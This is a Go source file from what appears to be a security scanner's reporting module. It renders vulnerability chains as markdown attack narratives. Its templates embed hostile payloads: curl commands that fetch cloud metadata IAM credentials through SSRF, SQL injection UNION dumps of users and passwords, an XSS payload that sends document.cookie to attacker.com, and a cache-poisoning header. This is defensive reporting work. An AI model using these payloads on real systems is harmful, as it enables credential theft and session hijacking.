package report

import (
	"fmt"
	"strings"

	"github.com/stormbane-security/beacon/internal/finding"
)

// GenerateNarrative creates a human-readable attack story from a chain finding.
// Returns a markdown-formatted narrative explaining each step. The narrative
// extracts specific details from the finding's Evidence (URLs, parameters,
// services) so the output is concrete, not generic.
func GenerateNarrative(chainFinding finding.Finding, allFindings []finding.Finding) string {
	id := string(chainFinding.CheckID)

	switch {
	case id == "correlation.session_hijack_chain":
		return narrativeSessionHijack(chainFinding, allFindings)
	case id == "correlation.credential_theft_chain":
		return narrativeCredentialTheft(chainFinding, allFindings)
	case id == "chain.ssrf_to_cloud_creds":
		return narrativeSSRFToCloudCreds(chainFinding, allFindings)
	case id == "chain.default_creds_to_admin_access":
		return narrativeDefaultCredsToAdmin(chainFinding, allFindings)
	case id == "chain.env_to_database_access":
		return narrativeEnvToDatabase(chainFinding, allFindings)
	case id == "chain.sqli_to_credential_dump":
		return narrativeSQLiToCredentialDump(chainFinding, allFindings)
	case id == "chain.xss_to_session_theft_poc":
		return narrativeXSSToSessionTheft(chainFinding, allFindings)
	case id == "correlation.full_compromise_chain":
		return narrativeFullCompromise(chainFinding, allFindings)
	case id == "correlation.lateral_movement_chain":
		return narrativeLateralMovement(chainFinding, allFindings)
	case id == "correlation.cache_poisoning_chain":
		return narrativeCachePoison(chainFinding, allFindings)
	case id == "correlation.dns_rebinding_chain":
		return narrativeDNSRebinding(chainFinding, allFindings)
	case id == "correlation.auth_bypass_chain":
		return narrativeAuthBypass(chainFinding, allFindings)
	default:
		return narrativeGeneric(chainFinding, allFindings)
	}
}

// helper to pull a string from evidence, with fallback.
func evi(f finding.Finding, key, fallback string) string {
	if v, ok := f.Evidence[key].(string); ok && v != "" {
		return v
	}
	return fallback
}

// findRelated returns all findings for the same asset, excluding the chain finding itself.
func findRelated(chainFinding finding.Finding, allFindings []finding.Finding) []finding.Finding {
	var out []finding.Finding
	for _, f := range allFindings {
		if f.CheckID == chainFinding.CheckID && f.Asset == chainFinding.Asset {
			continue
		}
		if f.Asset == chainFinding.Asset {
			out = append(out, f)
		}
	}
	return out
}

// findByCheckPrefix returns the first finding matching a check ID prefix on the same asset.
func findByCheckPrefix(asset, prefix string, allFindings []finding.Finding) *finding.Finding {
	for i := range allFindings {
		if allFindings[i].Asset == asset && strings.HasPrefix(string(allFindings[i].CheckID), prefix) {
			return &allFindings[i]
		}
	}
	// Broaden: any asset.
	for i := range allFindings {
		if strings.HasPrefix(string(allFindings[i].CheckID), prefix) {
			return &allFindings[i]
		}
	}
	return nil
}

func narrativeSessionHijack(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	corsURL := evi(cf, "url", "https://"+asset)
	xssURL := evi(cf, "xss_url", "")
	xssParam := evi(cf, "parameter", "q")

	if xssURL == "" {
		if xf := findByCheckPrefix(asset, "web.xss", all); xf != nil {
			xssURL = evi(*xf, "url", "https://"+asset+"/search")
			xssParam = evi(*xf, "parameter", xssParam)
		} else {
			xssURL = "https://" + asset + "/search"
		}
	}

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Session Hijack via CORS + XSS\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker can steal any user's session and impersonate them.\n\n")

	fmt.Fprintf(&b, "### Step 1: CORS Misconfiguration\n")
	fmt.Fprintf(&b, "The server at `%s` reflects any Origin header with\n", asset)
	fmt.Fprintf(&b, "`Access-Control-Allow-Credentials: true`. This allows JavaScript from\n")
	fmt.Fprintf(&b, "any domain to make authenticated requests.\n\n")

	fmt.Fprintf(&b, "### Step 2: Reflected XSS\n")
	fmt.Fprintf(&b, "The page at `%s` reflects user input via the `%s` parameter without encoding.\n", xssURL, xssParam)
	fmt.Fprintf(&b, "An attacker can inject `<script>` tags that execute in the victim's browser.\n\n")

	fmt.Fprintf(&b, "### Step 3: Cookie Theft\n")
	fmt.Fprintf(&b, "Session cookies lack the `HttpOnly` flag. JavaScript can read\n")
	fmt.Fprintf(&b, "`document.cookie` and exfiltrate the session token.\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Attacker crafts a URL: `%s?%s=<script>...</script>`\n", xssURL, xssParam)
	fmt.Fprintf(&b, "2. Victim clicks the link\n")
	fmt.Fprintf(&b, "3. XSS payload executes in victim's browser\n")
	fmt.Fprintf(&b, "4. Script reads `document.cookie` (no HttpOnly protection)\n")
	fmt.Fprintf(&b, "5. Script sends cookie to attacker's server via CORS (no origin restriction on `%s`)\n", corsURL)
	fmt.Fprintf(&b, "6. Attacker replays the cookie to access victim's account\n")

	return b.String()
}

func narrativeCredentialTheft(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	filePath := evi(cf, "path", "/.env")
	credSource := evi(cf, "credential_source", filePath)
	snippet := evi(cf, "snippet", "DATABASE_URL=postgres://admin:p4ssw0rd@db.internal:5432/prod")
	grantTarget := evi(cf, "grants_access_to", "database")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Credential Theft via Exposed Configuration\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker can harvest production credentials and access backend systems directly.\n\n")

	fmt.Fprintf(&b, "### Step 1: Configuration File Exposed\n")
	fmt.Fprintf(&b, "The file `%s` on `%s` is publicly accessible and contains credentials:\n", credSource, asset)
	fmt.Fprintf(&b, "```\n%s\n```\n\n", snippet)

	fmt.Fprintf(&b, "### Step 2: Backend Access\n")
	fmt.Fprintf(&b, "Using the extracted credentials, the attacker connects directly to\n")
	fmt.Fprintf(&b, "the %s service.\n\n", grantTarget)

	fmt.Fprintf(&b, "### Step 3: Data Exfiltration\n")
	fmt.Fprintf(&b, "With %s access, the attacker can:\n", grantTarget)
	fmt.Fprintf(&b, "- Read all user records\n")
	fmt.Fprintf(&b, "- Extract password hashes\n")
	fmt.Fprintf(&b, "- Access payment/PII data\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Attacker fetches `https://%s%s`\n", asset, credSource)
	fmt.Fprintf(&b, "2. Parses credentials from the response\n")
	fmt.Fprintf(&b, "3. Connects to the %s backend using extracted credentials\n", grantTarget)
	fmt.Fprintf(&b, "4. Dumps sensitive data\n")

	return b.String()
}

func narrativeSSRFToCloudCreds(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	ssrfURL := evi(cf, "url", "https://"+asset+"/api/fetch")
	param := evi(cf, "parameter", "url")
	provider := evi(cf, "cloud_provider", "AWS")
	role := evi(cf, "iam_role", "ec2-instance-role")

	metaEndpoint := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
	if strings.EqualFold(provider, "gcp") {
		metaEndpoint = "http://metadata.google.internal/computeMetadata/v1/"
	} else if strings.EqualFold(provider, "azure") {
		metaEndpoint = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
	}

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: SSRF to %s Cloud Credential Theft\n\n", provider)
	fmt.Fprintf(&b, "**Impact:** An attacker can steal %s IAM credentials and access cloud resources (S3, RDS, etc.).\n\n", provider)

	fmt.Fprintf(&b, "### Step 1: Server-Side Request Forgery\n")
	fmt.Fprintf(&b, "The endpoint `%s` accepts a user-controlled `%s` parameter and fetches\n", ssrfURL, param)
	fmt.Fprintf(&b, "arbitrary URLs from the server side without validation.\n\n")

	fmt.Fprintf(&b, "### Step 2: Cloud Metadata Access\n")
	fmt.Fprintf(&b, "The attacker uses the SSRF to reach the %s metadata endpoint at\n", provider)
	fmt.Fprintf(&b, "`%s` and discovers IAM role `%s`.\n\n", metaEndpoint, role)

	fmt.Fprintf(&b, "### Step 3: Credential Extraction\n")
	fmt.Fprintf(&b, "The attacker fetches temporary credentials (AccessKeyId, SecretAccessKey,\n")
	fmt.Fprintf(&b, "SessionToken) for the `%s` role.\n\n", role)

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. `curl '%s?%s=%s'` -- discover IAM role\n", ssrfURL, param, metaEndpoint)
	fmt.Fprintf(&b, "2. `curl '%s?%s=%s%s'` -- extract credentials\n", ssrfURL, param, metaEndpoint, role)
	fmt.Fprintf(&b, "3. `export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...`\n")
	fmt.Fprintf(&b, "4. `aws s3 ls` -- access cloud resources as the instance role\n")

	return b.String()
}

func narrativeDefaultCredsToAdmin(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	service := evi(cf, "service", "admin panel")
	username := evi(cf, "username", "admin")
	password := evi(cf, "password", "admin")
	url := evi(cf, "url", "https://"+asset+"/admin")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Default Credentials to Admin Access\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker gains full administrative access to `%s` using default credentials.\n\n", service)

	fmt.Fprintf(&b, "### Step 1: Default Credentials\n")
	fmt.Fprintf(&b, "The %s at `%s` accepts the default credentials `%s:%s`.\n\n", service, url, username, password)

	fmt.Fprintf(&b, "### Step 2: Admin Panel Access\n")
	fmt.Fprintf(&b, "With valid admin credentials, the attacker can access the full\n")
	fmt.Fprintf(&b, "administrative interface at `%s`.\n\n", url)

	fmt.Fprintf(&b, "### Step 3: System Compromise\n")
	fmt.Fprintf(&b, "From the admin panel the attacker can:\n")
	fmt.Fprintf(&b, "- Create new admin accounts for persistence\n")
	fmt.Fprintf(&b, "- Modify application configuration\n")
	fmt.Fprintf(&b, "- Access or export user data\n")
	fmt.Fprintf(&b, "- Potentially achieve code execution via admin features\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Navigate to `%s`\n", url)
	fmt.Fprintf(&b, "2. Log in with `%s` / `%s`\n", username, password)
	fmt.Fprintf(&b, "3. Explore admin functionality for data access and code execution\n")

	return b.String()
}

func narrativeEnvToDatabase(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	envPath := evi(cf, "path", "/.env")
	snippet := evi(cf, "snippet", "DATABASE_URL=postgres://user:pass@db:5432/app")
	dbHost := evi(cf, "pivot_target", "db.internal")
	dbPort := evi(cf, "pivot_port", "5432")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Exposed .env to Database Access\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker extracts database credentials from a publicly accessible .env file and connects to the production database.\n\n")

	fmt.Fprintf(&b, "### Step 1: .env File Exposed\n")
	fmt.Fprintf(&b, "The file `%s` on `%s` is publicly accessible and contains:\n", envPath, asset)
	fmt.Fprintf(&b, "```\n%s\n```\n\n", snippet)

	fmt.Fprintf(&b, "### Step 2: Database Connection\n")
	fmt.Fprintf(&b, "Using the extracted credentials, the attacker connects to\n")
	fmt.Fprintf(&b, "the database at `%s:%s`.\n\n", dbHost, dbPort)

	fmt.Fprintf(&b, "### Step 3: Data Exfiltration\n")
	fmt.Fprintf(&b, "With database access, the attacker can:\n")
	fmt.Fprintf(&b, "- Enumerate all tables and schemas\n")
	fmt.Fprintf(&b, "- Dump user credentials and PII\n")
	fmt.Fprintf(&b, "- Modify or delete records\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. `curl https://%s%s` -- fetch exposed environment file\n", asset, envPath)
	fmt.Fprintf(&b, "2. Parse DATABASE_URL from the response\n")
	fmt.Fprintf(&b, "3. `psql -h %s -p %s -U <user> <dbname>` -- connect with stolen creds\n", dbHost, dbPort)
	fmt.Fprintf(&b, "4. `SELECT * FROM users;` -- exfiltrate data\n")

	return b.String()
}

func narrativeSQLiToCredentialDump(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	param := evi(cf, "parameter", "id")
	payload := evi(cf, "payload", "' UNION SELECT username,password FROM users--")
	recordCount := evi(cf, "record_count", "unknown number of")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: SQL Injection to Credential Dump\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker exploits SQL injection to extract %s credential records from the database.\n\n", recordCount)

	fmt.Fprintf(&b, "### Step 1: SQL Injection\n")
	fmt.Fprintf(&b, "The endpoint `%s` is vulnerable to SQL injection via the `%s` parameter.\n", url, param)
	fmt.Fprintf(&b, "Payload: `%s`\n\n", payload)

	fmt.Fprintf(&b, "### Step 2: Schema Enumeration\n")
	fmt.Fprintf(&b, "The attacker enumerates database tables and identifies credential storage\n")
	fmt.Fprintf(&b, "(e.g., `users`, `accounts`, `credentials` tables).\n\n")

	fmt.Fprintf(&b, "### Step 3: Credential Extraction\n")
	fmt.Fprintf(&b, "Using UNION-based or blind SQLi techniques, the attacker dumps\n")
	fmt.Fprintf(&b, "usernames, password hashes, and email addresses.\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Confirm injection: `%s?%s=%s`\n", url, param, payload)
	fmt.Fprintf(&b, "2. Enumerate tables: `' UNION SELECT table_name,NULL FROM information_schema.tables--`\n")
	fmt.Fprintf(&b, "3. Dump credentials: `' UNION SELECT username,password FROM users--`\n")
	fmt.Fprintf(&b, "4. Crack password hashes offline with hashcat/john\n")

	return b.String()
}

func narrativeXSSToSessionTheft(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	param := evi(cf, "parameter", "q")
	payload := evi(cf, "payload", "<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: XSS to Session Theft\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker steals user sessions via XSS because cookies lack HttpOnly protection.\n\n")

	fmt.Fprintf(&b, "### Step 1: Cross-Site Scripting\n")
	fmt.Fprintf(&b, "The endpoint `%s` reflects the `%s` parameter without sanitization,\n", url, param)
	fmt.Fprintf(&b, "allowing arbitrary JavaScript execution in the victim's browser.\n\n")

	fmt.Fprintf(&b, "### Step 2: Missing HttpOnly Flag\n")
	fmt.Fprintf(&b, "Session cookies on `%s` lack the `HttpOnly` flag, making them\n", asset)
	fmt.Fprintf(&b, "readable by JavaScript via `document.cookie`.\n\n")

	fmt.Fprintf(&b, "### Step 3: Session Exfiltration\n")
	fmt.Fprintf(&b, "The XSS payload reads the session cookie and sends it to an\n")
	fmt.Fprintf(&b, "attacker-controlled server.\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Craft malicious URL: `%s?%s=%s`\n", url, param, payload)
	fmt.Fprintf(&b, "2. Send link to victim (phishing, social engineering)\n")
	fmt.Fprintf(&b, "3. Victim clicks link; XSS fires in their browser\n")
	fmt.Fprintf(&b, "4. JavaScript reads `document.cookie` and exfiltrates it\n")
	fmt.Fprintf(&b, "5. Attacker replays the session cookie to impersonate the victim\n")

	return b.String()
}

func narrativeFullCompromise(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	entryPoint := evi(cf, "url", "https://"+asset)
	entryType := evi(cf, "injection_vector", "SQL injection")
	dbHost := evi(cf, "pivot_target", "db.internal")
	dataType := evi(cf, "data_type", "user credentials and PII")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Full Compromise Chain\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker achieves full data exfiltration from `%s` through chained vulnerabilities.\n\n", asset)

	fmt.Fprintf(&b, "### Step 1: Initial Entry (%s)\n", entryType)
	fmt.Fprintf(&b, "The attacker exploits %s at `%s` to gain a foothold.\n\n", entryType, entryPoint)

	fmt.Fprintf(&b, "### Step 2: Pivot to Backend\n")
	fmt.Fprintf(&b, "From the initial entry, the attacker pivots to the backend at `%s`,\n", dbHost)
	fmt.Fprintf(&b, "either through direct database access or SSRF to internal services.\n\n")

	fmt.Fprintf(&b, "### Step 3: Data Exfiltration\n")
	fmt.Fprintf(&b, "The attacker extracts %s from the compromised backend.\n\n", dataType)

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Exploit %s at `%s`\n", entryType, entryPoint)
	fmt.Fprintf(&b, "2. Pivot to `%s` via extracted credentials or SSRF\n", dbHost)
	fmt.Fprintf(&b, "3. Exfiltrate %s\n", dataType)
	fmt.Fprintf(&b, "4. Establish persistence if admin access was gained\n")

	return b.String()
}

func narrativeLateralMovement(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	service := evi(cf, "service", "unauthenticated service")
	pivotTarget := evi(cf, "pivot_target", "internal host")
	pivotPort := evi(cf, "pivot_port", "")
	url := evi(cf, "url", "https://"+asset)

	targetStr := pivotTarget
	if pivotPort != "" {
		targetStr = pivotTarget + ":" + pivotPort
	}

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Lateral Movement via %s\n\n", service)
	fmt.Fprintf(&b, "**Impact:** An attacker pivots from `%s` to internal systems at `%s`.\n\n", asset, targetStr)

	fmt.Fprintf(&b, "### Step 1: Unauthenticated Service Access\n")
	fmt.Fprintf(&b, "The %s at `%s` is accessible without authentication.\n\n", service, url)

	fmt.Fprintf(&b, "### Step 2: Internal Network Discovery\n")
	fmt.Fprintf(&b, "Through the exposed service, the attacker discovers internal hosts\n")
	fmt.Fprintf(&b, "and services not directly accessible from the internet.\n\n")

	fmt.Fprintf(&b, "### Step 3: Lateral Pivot\n")
	fmt.Fprintf(&b, "The attacker uses the exposed service to reach `%s`,\n", targetStr)
	fmt.Fprintf(&b, "bypassing network segmentation.\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Access the unauthenticated %s at `%s`\n", service, url)
	fmt.Fprintf(&b, "2. Enumerate internal network via error messages, SSRF, or service features\n")
	fmt.Fprintf(&b, "3. Pivot to `%s`\n", targetStr)
	fmt.Fprintf(&b, "4. Access data or services on the internal host\n")

	return b.String()
}

func narrativeCachePoison(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	header := evi(cf, "unkeyed_header", "X-Forwarded-Host")
	payload := evi(cf, "payload", "evil.attacker.com")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Cache Poisoning via Unkeyed Header\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker poisons the cache at `%s` to serve malicious content to all users.\n\n", asset)

	fmt.Fprintf(&b, "### Step 1: Unkeyed Header Reflection\n")
	fmt.Fprintf(&b, "The server at `%s` reflects the `%s` header in its response\n", url, header)
	fmt.Fprintf(&b, "but the CDN/cache does not include this header in the cache key.\n\n")

	fmt.Fprintf(&b, "### Step 2: Cache Poisoning\n")
	fmt.Fprintf(&b, "The attacker sends a request with `%s: %s`, and the\n", header, payload)
	fmt.Fprintf(&b, "poisoned response is cached by the CDN.\n\n")

	fmt.Fprintf(&b, "### Step 3: Mass Exploitation\n")
	fmt.Fprintf(&b, "All subsequent users requesting `%s` receive the cached\n", url)
	fmt.Fprintf(&b, "poisoned response, which can redirect them to a malicious site\n")
	fmt.Fprintf(&b, "or execute stored XSS.\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. `curl -H '%s: %s' '%s'` -- poison the cache\n", header, payload, url)
	fmt.Fprintf(&b, "2. Wait for CDN to cache the response\n")
	fmt.Fprintf(&b, "3. All users visiting `%s` receive the poisoned page\n", url)
	fmt.Fprintf(&b, "4. Poisoned page redirects to attacker site or executes XSS\n")

	return b.String()
}

func narrativeDNSRebinding(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	internalTarget := evi(cf, "pivot_target", "127.0.0.1")
	internalPort := evi(cf, "pivot_port", "80")
	service := evi(cf, "service", "internal service")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: DNS Rebinding Attack\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker bypasses same-origin policy via DNS rebinding to access `%s:%s` from the victim's browser.\n\n", internalTarget, internalPort)

	fmt.Fprintf(&b, "### Step 1: DNS Rebinding Setup\n")
	fmt.Fprintf(&b, "The domain `%s` resolves to a private IP address, indicating\n", asset)
	fmt.Fprintf(&b, "it may be vulnerable to DNS rebinding attacks.\n\n")

	fmt.Fprintf(&b, "### Step 2: Rebinding Execution\n")
	fmt.Fprintf(&b, "The attacker sets up a DNS server that alternates between their\n")
	fmt.Fprintf(&b, "own IP and the internal address `%s`. After the victim loads\n", internalTarget)
	fmt.Fprintf(&b, "the attacker's page, DNS rebinds to the internal IP.\n\n")

	fmt.Fprintf(&b, "### Step 3: Internal Service Access\n")
	fmt.Fprintf(&b, "JavaScript on the attacker's page now makes requests that reach\n")
	fmt.Fprintf(&b, "the %s at `%s:%s`, bypassing firewall rules.\n\n", service, internalTarget, internalPort)

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Attacker configures rebinding DNS for their domain\n")
	fmt.Fprintf(&b, "2. Victim visits attacker's page\n")
	fmt.Fprintf(&b, "3. DNS rebinds from attacker IP to `%s`\n", internalTarget)
	fmt.Fprintf(&b, "4. JavaScript accesses `%s:%s` as same-origin\n", internalTarget, internalPort)
	fmt.Fprintf(&b, "5. Attacker exfiltrates responses from the internal %s\n", service)

	return b.String()
}

func narrativeAuthBypass(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)
	service := evi(cf, "service", "admin panel")
	method := evi(cf, "injection_vector", "JWT algorithm confusion")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Authentication Bypass\n\n")
	fmt.Fprintf(&b, "**Impact:** An attacker bypasses authentication on `%s` to gain unauthorized access to `%s`.\n\n", asset, service)

	fmt.Fprintf(&b, "### Step 1: Authentication Weakness\n")
	fmt.Fprintf(&b, "The authentication mechanism at `%s` is vulnerable to %s.\n\n", url, method)

	fmt.Fprintf(&b, "### Step 2: Token Forgery / Bypass\n")
	fmt.Fprintf(&b, "The attacker crafts a forged authentication token or exploits the\n")
	fmt.Fprintf(&b, "weakness to bypass login entirely.\n\n")

	fmt.Fprintf(&b, "### Step 3: Persistent Unauthorized Access\n")
	fmt.Fprintf(&b, "With bypassed authentication, the attacker has persistent access to\n")
	fmt.Fprintf(&b, "the %s without valid credentials.\n\n", service)

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Identify %s weakness at `%s`\n", method, url)
	fmt.Fprintf(&b, "2. Forge authentication token or craft bypass request\n")
	fmt.Fprintf(&b, "3. Access `%s` as an authenticated user\n", service)
	fmt.Fprintf(&b, "4. Create a backdoor account for persistence\n")

	return b.String()
}

func narrativeGeneric(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: %s\n\n", cf.Title)
	fmt.Fprintf(&b, "**Impact:** %s\n\n", cf.Description)

	// Build steps from related findings.
	related := findRelated(cf, all)
	if len(related) > 0 {
		for i, r := range related {
			if i >= 5 {
				break
			}
			fmt.Fprintf(&b, "### Step %d: %s\n", i+1, r.Title)
			rURL := evi(r, "url", url)
			fmt.Fprintf(&b, "%s at `%s`.\n\n", r.Description, rURL)
		}
	} else {
		fmt.Fprintf(&b, "### Step 1: Initial Access\n")
		fmt.Fprintf(&b, "The attacker exploits the vulnerability at `%s`.\n\n", url)
		fmt.Fprintf(&b, "### Step 2: Exploitation\n")
		fmt.Fprintf(&b, "%s\n\n", cf.Description)
	}

	return b.String()
}
